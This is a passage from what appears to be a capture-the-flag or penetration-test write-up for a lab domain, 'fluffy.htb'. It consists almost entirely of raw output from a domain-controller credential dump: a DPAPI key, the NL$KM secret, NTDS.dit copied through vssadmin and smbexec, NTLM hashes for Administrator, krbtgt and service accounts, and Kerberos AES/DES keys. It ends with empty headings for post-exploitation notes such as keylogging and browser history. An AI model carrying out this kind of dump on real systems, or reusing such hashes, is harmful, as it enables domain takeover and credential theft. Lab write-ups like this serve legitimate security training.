dpapi_userkey:0xe410025a604608d81064e274f6eb46cba458ebd5
[*] NL$KM
 0000   0B 4A EC B4 04 86 59 99  A3 11 64 45 1D F8 EF E0   .J....Y...dE....
 0010   74 E0 BB 5A 07 EA AD B9  63 4D AB 03 B5 0F 69 3D   t..Z....cM....i=
 0020   C5 C2 F8 4E F0 EC EC B6  28 A2 59 AB BA 2B F0 A2   ...N....(.Y..+..
 0030   57 89 D1 62 FA 69 04 2A  31 57 54 5A FB B0 2A 18   W..b.i.*1WTZ..*.
NL$KM:0b4aecb404865999a31164451df8efe074e0bb5a07eaadb9634dab03b50f693dc5c2f84ef0ececb628a259abba2bf0a25789d162fa69042a3157545afbb02a18
[*] Searching for NTDS.dit
[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a copy. This might take some time
[*] Using smbexec method for remote execution
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 8ca25a3f676741c63bb944b06ded3893
[*] Reading and decrypting hashes from \\DC01.fluffy.htb\ADMIN$\Temp\uuGFhyKu.tmp
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7a9950c26fe9c3cbfe5b9ceaa21c9bfd:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9c3442d41139f13bd02f0695d56362b9:::
fluffy.htb\ca_svc:1103:aad3b435b51404eeaad3b435b51404ee:ca0f4f9e9eb8a092addf53bb03fc98c8:::
fluffy.htb\ldap_svc:1104:aad3b435b51404eeaad3b435b51404ee:22151d74ba3de931a352cba1f9393a37:::
fluffy.htb\p.agila:1601:aad3b435b51404eeaad3b435b51404ee:a51fede5012110e9a65bd3f470513867:::
fluffy.htb\winrm_svc:1603:aad3b435b51404eeaad3b435b51404ee:33bd09dcd697600edf6b3a7af4875767:::
fluffy.htb\j.coffey:1605:aad3b435b51404eeaad3b435b51404ee:dff933046fa0943ac993d35a054235e3:::
fluffy.htb\j.fleischman:1606:aad3b435b51404eeaad3b435b51404ee:10842ead8d1d060a2de1394e4b2ea460:::
[*] Kerberos keys from \\DC01.fluffy.htb\ADMIN$\Temp\uuGFhyKu.tmp
Administrator:aes256-cts-hmac-sha1-96:d79b7fb71c2fc3c913fb59a3ac7c19c16c6637783c2a3bafe87723e90e99d2d2
Administrator:aes128-cts-hmac-sha1-96:72330cfd187d8ced05afda3d9a9fefea
Administrator:des-cbc-md5:403ec8b9e6b0d031
DC01$:aes256-cts-hmac-sha1-96:34b5e3f67441a6c19509cb966b9e5392e48257ff5058e7a22a4282fe822a5751
DC01$:aes128-cts-hmac-sha1-96:19a1dd430a92c3568f04814342d8e486
DC01$:des-cbc-md5:b94a2fb0ef98614a
krbtgt:aes256-cts-hmac-sha1-96:bce1e1f6f529302071ea37bafc49764526db568a7808a0ed55313eeb86dce183
krbtgt:aes128-cts-hmac-sha1-96:c85fbebccd28b736047f75a96714374b
krbtgt:des-cbc-md5:b558703707f27a62
fluffy.htb\ca_svc:aes256-cts-hmac-sha1-96:8dad02a4db02f3ffb213195a04743c404aed41c128b2953160c4cbe04d71c51b
fluffy.htb\ca_svc:aes128-cts-hmac-sha1-96:0ea0cae5076362a19f909b53d96217eb
fluffy.htb\ca_svc:des-cbc-md5:89c8f802b6dcd3a1
fluffy.htb\ldap_svc:aes256-cts-hmac-sha1-96:f6bf787afe770c155767769caf708f9a38a877da0bf5a248b7f35eacec44395c
fluffy.htb\ldap_svc:aes128-cts-hmac-sha1-96:192716f566e02696ff9bb68eb7b31635
fluffy.htb\ldap_svc:des-cbc-md5:07b93b58ba3b6b58
fluffy.htb\p.agila:aes256-cts-hmac-sha1-96:d406a2be082d99748731aa06db12082be1ba82b785e9034b4c8c9bbee6ea9c81
fluffy.htb\p.agila:aes128-cts-hmac-sha1-96:3432d6e28d562b56b79724e8dd140902
fluffy.htb\p.agila:des-cbc-md5:94974cb649986192
fluffy.htb\winrm_svc:aes256-cts-hmac-sha1-96:d39116a2e57c08e6a11efd0d8bb095057757cbe33ef8071b5a2941ae7ffd6361
fluffy.htb\winrm_svc:aes128-cts-hmac-sha1-96:49f7be01bda911e219aa563d2b8b6c2b
fluffy.htb\winrm_svc:des-cbc-md5:5d7320d6866162bf
fluffy.htb\j.coffey:aes256-cts-hmac-sha1-96:6a75e552c557c6d62998edc7886e71a6c00194fffe5a745551bda945afce7bcc
fluffy.htb\j.coffey:aes128-cts-hmac-sha1-96:4ce6fb38d69657c43b83f77cfa57bbde
fluffy.htb\j.coffey:des-cbc-md5:83b685084f34ea04
fluffy.htb\j.fleischman:aes256-cts-hmac-sha1-96:e63c60e41f7f45687527fb9042d668272b7695c6478d3fa11f4c729fa7349b6b
fluffy.htb\j.fleischman:aes128-cts-hmac-sha1-96:dc9450b2c85e8c35f2be9e9fb9b2bbe1
fluffy.htb\j.fleischman:des-cbc-md5:760e31b00d20cd9e
[*] Cleaning up...
```


### Files

```bash

```


### Client side activities


#### Keylogging & Clipboard history

```bash

```


#### Browser

```bash

```


#### Files & directories access history

```bash

```


#### Application history

```bash

```